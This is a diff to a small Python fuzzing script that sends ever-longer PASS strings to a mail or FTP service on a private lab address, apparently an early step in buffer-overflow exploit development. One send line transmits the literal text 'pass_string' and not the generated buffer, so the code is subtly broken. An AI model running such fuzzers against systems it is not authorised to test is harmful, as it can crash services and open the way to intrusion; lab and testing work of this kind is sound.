@@ -14,12 +14,10 @@ while len(buffer) <= 60:
 for string in buffer:
     print("Fuzzing PASS with %s bytes" % len(string))
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# Connect to Windows 7 machine IP, POP3 service
-    connect=s.connect(('10.0.0.221',110))
+    connect=s.connect(('10.0.0.217',21))
     s.recv(1024)
     s.send(b'USER username\r\n')
     s.recv(1024)
     pass_string = f'PASS {string}\r\n'
     s.send(b'pass_string')
-    s.send(b'QUIT\r\n')
     s.close()
